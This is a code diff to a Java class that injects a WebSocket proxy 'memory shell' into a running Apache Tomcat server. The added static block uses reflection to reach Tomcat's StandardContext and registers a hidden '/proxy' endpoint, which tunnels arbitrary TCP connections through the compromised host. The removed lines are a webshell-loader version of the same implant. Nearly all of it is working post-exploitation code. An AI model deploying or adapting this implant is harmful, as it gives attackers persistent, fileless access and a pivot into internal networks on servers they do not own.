@@ -1,4 +1,8 @@
+import org.apache.catalina.core.StandardContext;
+import org.apache.catalina.loader.WebappClassLoaderBase;
+import org.apache.catalina.webresources.StandardRoot;
 import java.io.ByteArrayOutputStream;
+import java.lang.reflect.Field;
 import java.net.InetSocketAddress;
 import java.nio.ByteBuffer;
 import java.nio.channels.AsynchronousSocketChannel;
@@ -6,81 +10,59 @@ import java.nio.channels.CompletionHandler;
 import java.util.HashMap;
 import java.util.concurrent.Future;
 import java.util.concurrent.TimeUnit;
-import javax.servlet.*;
-import javax.websocket.Endpoint;
-import javax.websocket.EndpointConfig;
-import javax.websocket.MessageHandler;
-import javax.websocket.Session;
+import javax.websocket.*;
 import javax.websocket.server.ServerContainer;
 import javax.websocket.server.ServerEndpointConfig;
 
-public final class WebSocket_Proxy extends Endpoint implements MessageHandler.Whole<ByteBuffer>,CompletionHandler<Integer, Session> {
+public class wsproxy extends Endpoint implements MessageHandler.Whole<ByteBuffer>,CompletionHandler<Integer, Session> {
 
     private Session session;
-    private String Pwd;
-    private String path;
-    private String secretKey;
-    private HashMap parameterMap;
-    private ServletConfig servletConfig;
-    private ServletContext servletContext;
-    final ByteBuffer buffer = ByteBuffer.allocate(102400);
-    private AsynchronousSocketChannel client = null;
     long i = 0;
+    private AsynchronousSocketChannel client = null;
+    final ByteBuffer buffer = ByteBuffer.allocate(102400);
     ByteArrayOutputStream baos = new ByteArrayOutputStream();
     HashMap<String,AsynchronousSocketChannel> map = new HashMap<String,AsynchronousSocketChannel>();
 
-    public WebSocket_Proxy() {}
+    public wsproxy() {}
 
-
-    public boolean equals(Object obj) {
+    static {
+        String path = "/proxy";
+        WebappClassLoaderBase webappClassLoaderBase = (WebappClassLoaderBase) Thread.currentThread().getContextClassLoader();
+        StandardRoot standardroot = (StandardRoot) webappClassLoaderBase.getResources();
+        if (standardroot == null){
+            Field field = null;
+            try {
+                field = webappClassLoaderBase.getClass().getDeclaredField("resources");
+                field.setAccessible(true);
+            }catch (Exception e){
+                try {
+                    field = webappClassLoaderBase.getClass().getSuperclass().getDeclaredField("resources");
+                } catch (NoSuchFieldException ex) {
+                    ex.printStackTrace();
+                }
+                field.setAccessible(true);
+            }
+            try {
+                standardroot = (StandardRoot)field.get(webappClassLoaderBase);
+            } catch (IllegalAccessException e) {
+                e.printStackTrace();
+            }
+        }
+        StandardContext standardContext = (StandardContext) standardroot.getContext();
+        ServerEndpointConfig configEndpoint = ServerEndpointConfig.Builder.create(wsproxy.class, path).build();
+        ServerContainer container = (ServerContainer) standardContext.getServletContext().getAttribute(ServerContainer.class.getName());
         try {
-            this.parameterMap = (HashMap)obj;
-            this.servletContext = (ServletContext)this.parameterMap.get("servletContext");
-            this.Pwd = get("pwd");
-            this.path = get("path");
-            this.secretKey = get("secretKey");
+            container.addEndpoint(configEndpoint);
         } catch (Exception e) {
             e.printStackTrace();
-            return false;
         }
-        return true;
+
     }
 
-    public String toString() {
-        this.parameterMap.put("result", addWs().getBytes());
-        this.parameterMap = null;
-        return "";
-    }
 
-    public String addWs() {
-        ServerEndpointConfig configEndpoint = ServerEndpointConfig.Builder.create(this.getClass(), this.path).build();
-        ServletContext x = (ServletContext) this.servletContext;
-        ServerContainer container = (ServerContainer) x.getAttribute(ServerContainer.class.getName());
-        try {
-            if (x.getAttribute(this.path) == null){
-                container.addEndpoint(configEndpoint);
-                x.setAttribute(this.path,this.path);
-                return "success";
-            } else {
-                return "path err";
-            }
-        } catch (Exception ignored) {
-        }
-        return "fail";
-    }
 
     @Override
-    public void onMessage(ByteBuffer message) {
-        try {
-            message.clear();
-            i++;
-            process(message,session);
-        } catch (Exception ignored) {
-        }
-    }
-
-    @Override
-    public void completed(Integer result, final Session channel) {
+    public void completed(Integer result, Session channel) {
         buffer.clear();
         try {
             if(buffer.hasRemaining() && result>=0)
@@ -106,16 +88,36 @@ public final class WebSocket_Proxy extends Endpoint implements MessageHandler.Wh
         } catch (Exception ignored) {
         }
     }
+
     @Override
-    public void failed(Throwable t, Session channel) {t.printStackTrace();}
+    public void failed(Throwable t, Session channel) {
+        t.printStackTrace();
+    }
+
+    @Override
+    public void onMessage(ByteBuffer message) {
+        try {
+            message.clear();
+            i++;
+            process(message,session);
+        } catch (Exception ignored) {
+        }
+    }
+
+    @Override
+    public void onOpen(Session session, EndpointConfig endpointConfig) {
+        this.i = 0;
+        this.session = session;
+        session.setMaxBinaryMessageBufferSize(1024*1024*1024);
+        session.setMaxTextMessageBufferSize(1024*1024*1024);
+        session.addMessageHandler(this);
+    }
 
     void readFromServer(Session channel,final AsynchronousSocketChannel client){
         this.client = client;
         buffer.clear();
         client.read(buffer, channel, this);
     }
-
-
     void process(ByteBuffer z,Session channel)
     {
         try{
@@ -145,36 +147,6 @@ public final class WebSocket_Proxy extends Endpoint implements MessageHandler.Wh
                 channel.getBasicRemote().sendText("HTTP/1.1 200 Connection Established\r\n\r\n");
             }
         }catch(Exception ignored){
-        }
-    }
-    @Override
-    public void onOpen(final Session session, EndpointConfig config) {
-        this.i = 0;
-        this.session = session;
-        session.setMaxBinaryMessageBufferSize(1024*1024*1024);
-        session.setMaxTextMessageBufferSize(1024*1024*1024);
-        session.addMessageHandler(this);
-    }
-
-    public void init(ServletConfig paramServletConfig) throws ServletException {
-        this.servletConfig = paramServletConfig;
-    }
-
-    public ServletConfig getServletConfig() {
-        return this.servletConfig;
-    }
-
-    public String getServletInfo() {
-        return "";
-    }
-
-    public void destroy() {}
-
-    public String get(String key) {
-        try {
-            return new String((byte[])this.parameterMap.get(key));
-        } catch (Exception e) {
-            return null;
         }
     }
 }
